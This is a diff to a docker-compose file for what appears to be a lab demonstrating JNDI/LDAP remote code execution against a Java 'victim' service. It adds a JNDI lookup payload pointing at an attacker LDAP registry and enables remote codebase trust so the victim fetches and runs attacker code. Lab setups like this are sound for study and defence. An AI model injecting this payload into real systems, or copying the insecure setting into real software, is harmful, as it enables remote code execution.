@@ -1,6 +1,22 @@
 version: "3"
 services:
 
+  # The service on which to gain RCE
+  victim:
+    build:
+      context:    ${PWD}/src/victim/
+      dockerfile: ${PWD}/docker/gradle-app.Dockerfile
+      args:
+        APP_NAME: "victim"
+    environment:
+      JAVA_OPTS: >-
+        -Dvictim-payload=$${jndi:ldap://attacker_ldap_registry:1389/cn=made-class,dc=ldap-registry,dc=attacker}
+        -Dcom.sun.jndi.ldap.object.trustURLCodebase=true
+    depends_on:
+      - attacker_ldap_registry
+      - attacker_ldap_registry_setup
+      - attacker_codebase
+
   # The attacker hosts a server which the victim can use to look up the location
   # of the code to execute. Specifically, the directory server will contain a
   # `Reference` containing a factory class to use to construct an object. This
